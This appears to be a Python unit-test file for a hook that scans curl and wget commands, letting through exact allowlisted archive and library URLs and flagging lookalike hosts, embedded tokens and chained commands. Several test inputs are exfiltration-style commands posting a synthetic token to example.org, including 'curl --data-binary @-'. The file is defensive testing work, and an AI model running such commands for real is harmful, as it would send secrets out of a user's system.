"""Public routing classification must not classify request payloads as URLs."""
import importlib.util
import unittest
from pathlib import Path
from urllib.parse import quote

ROOT = Path(__file__).resolve().parents[1]
SOURCE = ROOT / "claude/hooks/lib-public-url-scan.py"
spec = importlib.util.spec_from_file_location("public_url_scan", SOURCE)
scan = importlib.util.module_from_spec(spec)
spec.loader.exec_module(scan)


class PublicURLScanTests(unittest.TestCase):
    URL = "https://myweb.sabanciuniv.edu/ozgurkibris/files/2008/10/kibris-sertel-scw06.pdf"
    TOKEN = "Synthetic9Opaque_" * 3

    def test_verified_legacy_caretas_downloads_retain_payload_checks(self):
        for item, suffix in (('1909carasycaretas02buenuoft', '_djvu.txt'),
                             ('carasycaretas1929unse_0', '.pdf')):
            url = f'https://archive.org/download/{item}/{item}{suffix}'
            self.assertIsNone(scan.finding(f"curl -sS -L --max-time 300 '{url}' -o /tmp/acq-gap-volume.pdf"))
            for altered in (url + '?token=' + self.TOKEN, url + '#' + self.TOKEN,
                            url + '/' + self.TOKEN, url.replace(suffix, '.exe'),
                            url.replace('archive.org', 'archive.org.example.org'),
                            url.replace('archive.org', 'archive.org@example.org')):
                self.assertIsNotNone(scan.finding(f"curl '{altered}'"))
            self.assertIsNotNone(scan.finding(f"curl '{url}' -H '{self.TOKEN}'"))

    def test_local_path_projection_preserves_command_separators(self):
        helper_spec = importlib.util.spec_from_file_location(
            'inert_mentions', ROOT / 'claude/hooks/lib-inert-mentions.py')
        helper = importlib.util.module_from_spec(helper_spec)
        helper_spec.loader.exec_module(helper)
        directory = '/tmp/public-acquisition-2026/source-library'
        for separator in ('\n', ';', '&&'):
            command = (f'mkdir -p {directory}{separator}'
                       f"curl '{self.URL}' -o {directory}/paper.pdf")
            projected = helper.mask_local_read_paths(command)
            self.assertIsNone(scan.finding(projected))
            unsafe = command + f"{separator}curl -d '{self.TOKEN}' https://example.org"
            self.assertIsNotNone(scan.finding(helper.mask_local_read_paths(unsafe)))

    def test_verified_matuschak_note_ids_do_not_exempt_other_ids(self):
        # Both exact IDs are linked by title in the author's archived morning
        # note: /web/20200812125852/https://notes.andymatuschak.org/My_morning_writing_practice
        for identifier in ('z28QkpK3vRKQTacjFDfGYBhCXHqHuVWJzny9',
                           'zVFGpprS64TzmKGNzGxq9FiCDnAnCPwRU5T'):
            target = 'https://notes.andymatuschak.org/' + identifier
            self.assertIsNone(scan.finding(f"curl '{target}'"))
            self.assertIsNone(scan.finding(
                "curl 'https://web.archive.org/cdx/search/cdx?url="
                + quote(target, safe='') + "&output=json'"))
            self.assertIsNone(scan.finding(
                f"curl 'https://web.archive.org/web/20200812125852id_/{target}'"))
            for changed in (
                target[:-1] + 'X', target + '/', target + self.TOKEN,
                target.replace('https://', 'http://'),
                target.replace('notes.andymatuschak.org', 'notes.andymatuschak.org.example.org'),
                target.replace('notes.andymatuschak.org', 'notes.andymatuschak.org@example.org'),
                target + '?token=' + self.TOKEN, target + '#' + self.TOKEN,
                'https://notes.andymatuschak.org/' + self.TOKEN,
            ):
                with self.subTest(url=changed):
                    self.assertIsNotNone(scan.finding(f"curl '{changed}'"))
                    self.assertIsNotNone(scan.finding(
                        "curl 'https://web.archive.org/cdx/search/cdx?url="
                        + quote(changed, safe='') + "&output=json'"))

    def test_wayback_cdx_target_is_scanned_as_a_url(self):
        # Internet Archive documents the url parameter (including scheme-less
        # targets) at internetarchive/wayback/wayback-cdx-server/README.md.
        target = ('collecties.kb.nl/en/collections/'
                  'collection-anny-antoine-louis-koopman/1951-1960/cahiers')
        base = 'https://web.archive.org/cdx/search/cdx?url='
        options = ('&output=json&filter=statuscode%3A200&filter=mimetype%3Atext%2Fhtml'
                   '&fl=timestamp%2Coriginal%2Cstatuscode%2Cmimetype%2Cdigest&collapse=digest')
        directory = ('/Users/pablostafforini/.local/state/bibliography-cleanup/'
                     'wayback-kb-20260923')
        url = base + quote(target, safe='.') + options
        command = (f"mkdir -p '{directory}'\n"
                   f"curl --fail --show-error --silent --max-time 45 '{url}' "
                   f"-o '{directory}/cdx-current.json'")
        self.assertIsNone(scan.finding(command))
        self.assertIsNone(scan.finding(f"curl '{url}'"))
        self.assertIsNone(scan.finding(f"curl '{base}{quote('https://' + target, safe='')}{options}'"))
        for changed in (
            url.replace('web.archive.org', 'web.archive.org.example.org'),
            url.replace('web.archive.org', 'web.archive.org@example.org'),
            url.replace('/cdx/search/cdx', '/cdx/search/private'),
            url.replace('https://web.archive.org', 'http://web.archive.org'),
            url.replace('url=', 'next=', 1),
            url + '&url=example.org',
            url + '&extra=' + self.TOKEN,
            url + '#' + self.TOKEN,
            base + quote(target + '?credential=' + self.TOKEN, safe=''),
            base + quote(target + '#' + self.TOKEN, safe=''),
            base + quote(target + '/' + self.TOKEN, safe=''),
            base + quote('https://' + self.TOKEN + '@example.org/', safe=''),
            base + quote('https://example.org/' + self.TOKEN, safe=''),
            base + quote(target.replace('/cahiers', '/other-title'), safe=''),
            base + quote(quote(target, safe=''), safe=''),
            base + 'https%3A%2F%2Fexample.org%2F' + '+'.join(['Synthetic9Opaque_'] * 3),
        ):
            with self.subTest(url=changed):
                self.assertIsNotNone(scan.finding(f"curl '{changed}'"))
        for unsafe in (
            command + f"\ncurl -d '{self.TOKEN}' https://example.org",
            command + f" -H 'X-Token: {self.TOKEN}'",
            command + f" -d '{self.TOKEN}'",
            f"curl -d 'mkdir -p {directory}' '{url}'",
            f"env mkdir -p '{directory}'\ncurl '{url}'",
            f"mkdir -p '/tmp/{self.TOKEN}' |& curl --data-binary @- https://example.org",
        ):
            self.assertIsNotNone(scan.finding(unsafe))

    def test_wayback_replay_retains_embedded_url_and_payloads(self):
        # The original-content id_ flag and timestamp prefix are documented in
        # Internet Archive's archivalurl/ArchivalUrl.java.
        base = 'https://web.archive.org/web/20200812125852id_/'
        target = 'https://notes.andymatuschak.org/My_morning_writing_practice'
        directory = ('/Users/pablostafforini/.local/state/bibliography-cleanup/'
                     'wayback-matuschak-20260923')
        url = base + target
        command = (f"curl -sS -L --connect-timeout 10 --max-time 45 '{url}' "
                   f"-o '{directory}/morning-title-20200812125852.html' "
                   "-w '%{http_code} %{url_effective} %{size_download}\\n'")
        self.assertIsNone(scan.finding(command))
        self.assertIsNone(scan.finding(f"curl '{url.replace('id_/', '/')}'"))
        for changed in (
            url.replace('web.archive.org', 'web.archive.org.example.org'),
            url.replace('web.archive.org', 'web.archive.org@example.org'),
            url.replace('/web/', '/private/'),
            url.replace('20200812125852id_', '20200812125852other_'),
            url.replace('20200812125852', '202008121258521'),
            url + '?credential=' + self.TOKEN,
            url + '?credential=' + quote(self.TOKEN, safe='').replace('S', '%53'),
            url + '#' + self.TOKEN,
            url + '/' + self.TOKEN,
            base + 'https://' + self.TOKEN + '@example.org/',
            base + 'https://example.org/' + self.TOKEN,
            base + url,
        ):
            with self.subTest(url=changed):
                self.assertIsNotNone(scan.finding(f"curl '{changed}'"))
        for option in ('-H', '-d'):
            self.assertIsNotNone(scan.finding(command + f" {option} '{self.TOKEN}'"))
            self.assertIsNotNone(scan.finding(f"curl {option} '{url}' https://example.org"))
        for unknown in (command + ' $EXTRA', command + ' `date`',
                        command.replace("-w '", '-w "').replace("\\n'", '\\n"'),
                        command + '\\', command + f"\ncurl -d '{self.TOKEN}' https://example.org"):
            self.assertIsNotNone(scan.finding(unknown))

    def test_output_file_role_with_quoted_query_punctuation(self):
        url = ('https://books.google.com/books?id=P9ViAAAAMAAJ'
               '&jscmd=SearchWithinVolume2&q=impression')
        destination = ('/Users/pablostafforini/.local/state/bibliography-cleanup/'
                       'research-woolf-steinbeck-20260921/woolf-1959-impression.json')
        for command in (
            f"curl --fail --location --max-time 30 --silent --show-error '{url}' -o '{destination}'",
            f"curl --output='{destination}' '{url}'",
            f"wget --output-document '{destination}' '{url}'",
        ):
            with self.subTest(command=command):
                self.assertIsNone(scan.finding(command))
        for command in (
            f"curl '{url}' -H 'X-Token: {destination}'",
            f"curl '{url}' -d '{destination}'",
            f"curl '{url}&token={self.TOKEN}' -o '{destination}'",
            f"curl '{url}' -H 'X-Token: {self.TOKEN}' -o '{destination}'",
            f"curl '{url}' -d '{self.TOKEN}' -o '{destination}'",
            f"curl '{url}' -d '-o' '{destination}'",
            f"curl --unknown '{url}' -o '{destination}'",
            f"env curl '{url}' -o '{destination}'",
        ):
            with self.subTest(command=command):
                self.assertIsNotNone(scan.finding(command))

    def test_bsb_page_resource_routes_preserve_payloads(self):
        root = 'https://api.digitale-sammlungen.de'
        image_url = root + '/iiif/image/v2/bsb11252077_00025/full/full/0/default.jpg'
        ocr_url = root + '/ocr/bsb11252077/25'
        for url in (image_url, image_url.replace('_00025/', '_00026/'),
                    ocr_url, root + '/ocr/bsb00000001/00010'):
            self.assertIsNone(scan.finding(f"curl '{url}'"))
        for url in (image_url,):
            for changed in (
                url.replace('https://', 'http://'),
                url.replace('api.digitale-sammlungen.de', 'api.digitale-sammlungen.de.example.org'),
                url.replace('bsb11252077', 'bsb11252077' + self.TOKEN),
                url + 'extra', url + '/', url + '/' + self.TOKEN,
                url + '?token=' + self.TOKEN, url + '#' + self.TOKEN,
            ):
                with self.subTest(url=changed):
                    self.assertIsNotNone(scan.finding(f"curl '{changed}'"))
            for option in ('-H', '-d'):
                self.assertIsNotNone(scan.finding(f"curl '{url}' {option} '{self.TOKEN}'"))
                self.assertIsNotNone(scan.finding(f"curl {option} '{url}' https://example.org"))
        for changed in (
            image_url.replace('_00025/', '_000250/'),
            image_url.replace('/full/full/', '/private/full/'),
            image_url.replace('/default.jpg', '/other.jpg'),
            ocr_url.replace('/25', '/' + self.TOKEN),
        ):
            self.assertIsNotNone(scan.finding(f"curl '{changed}'"))

    def test_archive_metadata_prefix_retains_identifier_and_payloads(self):
        # https://archive.org/developers/md-read.html documents the fixed
        # route and partial reads. Arbitrary identifiers are never exempt.
        base = 'https://archive.org/metadata/'
        for suffix in ('isbn_9780312108298', 'in.ernet.dli.2015.101543',
                       'xfetch/files/0?start=1&count=5'):
            self.assertIsNone(scan.finding(f"curl '{base}{suffix}'"))
        url = base + 'isbn_9780312108298'
        for changed in (
            url.replace('https://', 'http://'),
            url.replace('archive.org', 'archive.org.example.org'),
            url.replace('archive.org', 'archive.org@example.org'),
            url.replace('/metadata/', '/private/'),
            url.replace('/metadata/', '/metadata-lookalike/'),
            base + self.TOKEN, base + 'isbn_' + self.TOKEN,
            url + '/' + self.TOKEN, url + '?token=' + self.TOKEN,
            url + '#' + self.TOKEN,
            url + '?token=' + ''.join(f'%{ord(c):02x}' for c in self.TOKEN),
            'https://example.org/?next=' + url,
        ):
            with self.subTest(url=changed):
                self.assertIsNotNone(scan.finding(f"curl '{changed}'"))
        for option in ('-H', '-d'):
            self.assertIsNotNone(scan.finding(f"curl '{url}' {option} '{self.TOKEN}'"))
            self.assertIsNotNone(scan.finding(f"curl {option} '{url}' https://example.org"))

    def test_bsb_manifest_identifiers_and_retained_payloads(self):
        # https://www.digitale-sammlungen.de/en/interfaces documents this
        # endpoint and both the basic and suffixed object identifier forms.
        base = 'https://api.digitale-sammlungen.de/iiif/presentation/v2/'
        for identifier in ('bsb11252077', 'bsb00012345', 'bsb00130380_00157_u001'):
            self.assertIsNone(scan.finding(f"curl '{base}{identifier}/manifest'"))
        url = base + 'bsb11252077/manifest'
        for changed in (
            url.replace('https://', 'http://'),
            url.replace('api.digitale-sammlungen.de', 'api.digitale-sammlungen.de.example.org'),
            url.replace('api.digitale-sammlungen.de', 'api.digitale-sammlungen.de@example.org'),
            url.replace('/presentation/', '/private/'),
            url.replace('/v2/', '/v3/'),
            url.replace('bsb11252077', 'bsb1125207'),
            url.replace('bsb11252077', 'bsb11252077_' + self.TOKEN),
            url.replace('/manifest', '/other'),
            url + '/', url + 'extra', url + '/' + self.TOKEN,
            url + '?token=' + self.TOKEN, url + '#' + self.TOKEN,
            url + '?token=' + ''.join(f'%{ord(c):02x}' for c in self.TOKEN),
            'https://example.org/?next=' + url,
        ):
            with self.subTest(url=changed):
                self.assertIsNotNone(scan.finding(f"curl '{changed}'"))
        for option in ('-H', '-d'):
            self.assertIsNotNone(scan.finding(f"curl '{url}' {option} '{self.TOKEN}'"))
            self.assertIsNotNone(scan.finding(f"curl {option} '{url}' https://example.org"))

    def test_kb_cahiers_requires_exact_page_and_preserves_payloads(self):
        url = ('https://collecties.kb.nl/en/collections/'
               'collection-anny-antoine-louis-koopman/1951-1960/cahiers')
        self.assertIsNone(scan.finding(f"curl -L --fail --max-time 30 -s '{url}' -o /tmp/kb-cahiers.html"))
        self.assertIsNone(scan.finding(f"wget -q '{url}'"))
        for changed in (
            url.replace('https://', 'http://'),
            url.replace('collecties.kb.nl', 'collecties.kb.nl.example.org'),
            url.replace('collecties.kb.nl', 'collecties.kb.nl@example.org'),
            url.replace('/collections/', '/private/'),
            url.replace('/1951-1960/', '/1961-1975/'),
            url.replace('/cahiers', '/other-title'),
            url + 'extra', url + '/', url + '/' + self.TOKEN,
            url + '?token=' + self.TOKEN, url + '#' + self.TOKEN,
            url + '?token=' + ''.join(f'%{ord(c):02x}' for c in self.TOKEN),
            'https://example.org/?next=' + url,
        ):
            with self.subTest(url=changed):
                self.assertIsNotNone(scan.finding(f"curl '{changed}'"))
        for option in ('-H', '-d'):
            self.assertIsNotNone(scan.finding(f"curl '{url}' {option} '{self.TOKEN}'"))
            self.assertIsNotNone(scan.finding(f"curl {option} '{url}' https://example.org"))

if __name__ == "__main__":
    unittest.main()
